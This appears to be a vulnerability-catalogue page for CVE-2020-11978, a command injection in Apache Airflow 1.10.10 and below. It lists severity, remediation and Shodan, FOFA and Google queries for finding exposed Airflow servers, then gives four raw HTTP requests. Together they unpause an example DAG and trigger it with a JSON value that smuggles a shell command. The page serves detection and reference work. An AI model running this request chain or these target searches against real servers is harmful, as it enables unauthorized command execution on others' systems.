---
layout: "post"
cve_id: "CVE-2020-11978"
title: "Apache Airflow <=1.10.10 - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2020/CVE-2020-11978.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-11978.yaml"
author: "pdteam"
severity: "high"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected system.
"
remediation: "If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable."
reference:
  - "https://github.com/pberba/CVE-2020-11978"
  - "https://twitter.com/wugeej/status/1400336603604668418"
  - "https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E"
  - "https://nvd.nist.gov/vuln/detail/CVE-2020-11978"
  - "http://packetstormsecurity.com/files/174764/Apache-Airflow-1.10.10-Remote-Code-Execution.html"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 8.8, 'cve-id': 'CVE-2020-11978', 'cwe-id': 'CWE-78', 'epss-score': 0.94272, 'epss-percentile': 0.99931, 'cpe': 'cpe:2.3:a:apache:airflow:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 4, 'vendor': 'apache', 'product': 'airflow', 'shodan-query': ['title:"Airflow - DAGs" || http.html:"Apache Airflow"', 'http.title:"airflow - dags" || http.html:"apache airflow"', 'http.title:"sign in - airflow"', 'product:"redis"'], 'fofa-query': ['title="sign in - airflow"', 'apache airflow', 'title="airflow - dags" || http.html:"apache airflow"'], 'google-query': ['intitle:"sign in - airflow"', 'intitle:"airflow - dags" || http.html:"apache airflow"']}"
tags:
  - "cve2020"
  - "cve"
  - "packetstorm"
  - "apache"
  - "airflow"
  - "rce"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
Apache Airflow versions 1.10.10 and below are vulnerable to remote code/command injection vulnerabilities in one of the example DAGs shipped with Airflow. This could allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use).

## ðŸŒ HTTP Request
```nohighlight
GET /api/experimental/test HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) ConnectPC Safari/537.36 Browser
Connection: close
Accept: */*
Accept-Encoding: gzip
```

```nohighlight
GET /api/experimental/dags/example_trigger_target_dag/paused/false HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.12
Connection: close
Accept: */*
Accept-Encoding: gzip
```

```nohighlight
POST /api/experimental/dags/example_trigger_target_dag/dag_runs HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
Content-Length: 41
Accept: */*
Content-Type: application/json
Accept-Encoding: gzip

{"conf": {"message": "\"; touch test #"}}
```

```nohighlight
GET /api/experimental/dags/example_trigger_target_dag/dag_runs/E806kg/tasks/bash_task HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Connection: close
Accept: */*
Accept-Encoding: gzip
```

